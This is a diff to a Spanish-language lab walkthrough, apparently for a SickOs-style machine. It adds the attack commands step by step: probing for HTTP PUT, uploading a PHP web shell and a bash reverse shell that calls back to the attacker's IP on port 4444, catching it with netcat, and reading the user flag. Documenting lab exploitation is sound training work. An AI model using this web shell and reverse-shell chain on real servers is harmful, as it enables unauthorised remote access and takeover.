@@ -25,10 +25,13 @@ Para completar el laboratorio se requieren **dos terminales abiertas** en la má
 ## 🔎 FASE 1: Reconocimiento (Enumeración)
 Durante esta fase se analiza la superficie de ataque del servidor web.
 
-Se identifica que el directorio `/test/` es accesible y potencialmente vulnerable.  
+Se identifica que el directorio `/test/` es accesible y potencialmente vulnerable.
 El objetivo es comprobar si el servidor permite el método HTTP **PUT**, lo cual supondría una mala configuración de seguridad.
-
-Si el método **PUT** está habilitado, es posible subir archivos directamente al servidor, abriendo la puerta a la explotación.
+### 📌 Comando
+```bash
+curl -v -X OPTIONS http://localhost/test/
+```
+Como el método **PUT** está habilitado, es posible subir archivos directamente al servidor, abriendo la puerta a la explotación.
 
 ---
 
@@ -36,13 +39,38 @@ Si el método **PUT** está habilitado, es posible subir archivos directamente a
 Confirmada la vulnerabilidad, se procede a obtener acceso remoto al sistema.
 
 1. Se identifica la dirección IP de la máquina atacante, que actuará como destino de la conexión inversa.
+```bash
+ip addr show eth0
+```
+Copia tu IP obtenida e introdúcela donde veas TU_IP.
 2. Se prepara un payload que fuerza al servidor a iniciar una **reverse shell**.
+```bash
+echo "bash -i >& /dev/tcp/TU_IP/4444 0>&1" > rev.sh
+```
 3. Se crea un archivo PHP que permite ejecutar acciones en el servidor a través de peticiones web.
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
 4. Ambos archivos se suben al directorio vulnerable `/test/` aprovechando el método PUT.
-5. La máquina atacante se pone a la escucha en un puerto determinado.
+```bash
+curl -v -T rev.sh http://localhost/test/rev.sh
+curl -v -T shell.php http://localhost/test/shell.php
+```
+5. En la terminal 2, se pone a la escucha en el puerto configurado en la **reverse shell** del paso 2.
+```bash
+nc -lvnp 4444
+```
 6. Se ejecuta el archivo PHP, provocando que la víctima se conecte de vuelta.
-
+```bash
+curl "http://localhost/test/shell.php?cmd=bash%20/var/www/html/test/rev.sh"
+```
 Como resultado, se obtiene una shell con el usuario **www-data**, con privilegios limitados.
+7. Navega hasta el directorio donde se encuentra la primera flag.
+```bash
+cd /home/sickos
+ls
+cat user.txt
+```
 
 ---
 
